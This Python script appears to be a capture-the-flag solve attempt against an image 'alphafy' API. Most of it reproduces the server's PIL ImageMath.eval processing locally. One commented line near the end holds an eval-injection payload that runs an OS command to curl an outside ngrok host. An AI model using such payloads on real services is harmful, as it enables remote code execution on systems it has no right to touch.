import json
import base64
import requests
from PIL import Image, ImageMath
from io import BytesIO

url="http://134.209.22.191:32243/api/alphafy"
Headers={'content-type': 'application/json'}
data = {}
with open('code.jpg', mode='rb') as file:
    img = file.read()
data['image'] = base64.encodebytes(img).decode('utf-8')
color = data.get('background', [255,255,255])
#data=json.dumps(data)
dec_img = base64.b64decode(data.get('image').encode())
image = Image.open(BytesIO(dec_img)).convert('RGBA')
img_bands = [band.convert('F') for band in image.split()]

alpha = ImageMath.eval(
    f'''float(
        max(
        max(
            max(
            difference1(red_band, {color[0]}),
            difference1(green_band, {color[1]})
            ),
            difference1(blue_band, {color[2]})
        ),
        max(
            max(
            difference2(red_band, {color[0]}),
            difference2(green_band, {color[1]})
            ),
            difference2(blue_band, {color[2]})
        )
        )
    )''',
    difference1=lambda source, color: (source - color) / (255.0 - color),
    difference2=lambda source, color: (color - source) / color,
    red_band=img_bands[0],
    green_band=img_bands[1],
    blue_band=img_bands[2]
)
difference1=lambda source, color: (source - color) / (255.0 - color)
#print(difference1.color)
new_bands = [
            ImageMath.eval(
                'convert((image - color) / alpha + color, "L")',
                image=img_bands[i],
                color=color[i],
                alpha=alpha
            )
            for i in range(3)
        ]

new_bands.append(ImageMath.eval(
    'convert(alpha_band * alpha, "L")',
    alpha=alpha,
    alpha_band=img_bands[3]
))
for l in new_bands:
    l.show()
new_image = Image.merge('RGBA', new_bands)
background = Image.new('RGB', new_image.size, (0, 0, 0, 0))
background.paste(new_image.convert('RGB'), mask=new_image)

buffer = BytesIO()
new_image.save(buffer, format='PNG')
new_image.show()

#r=requests.post(url,json=data,headers=Headers, proxies={"http":"http://127.0.0.1:8080"})
#print(r.text)
#print(r.status_code)
#print(dec_img)
#print(image)
#ImageMath.eval("__import__(\"os\").system(\"curl https://3874-106-193-220-219.in.ngrok.io\")")
#alpha.show()
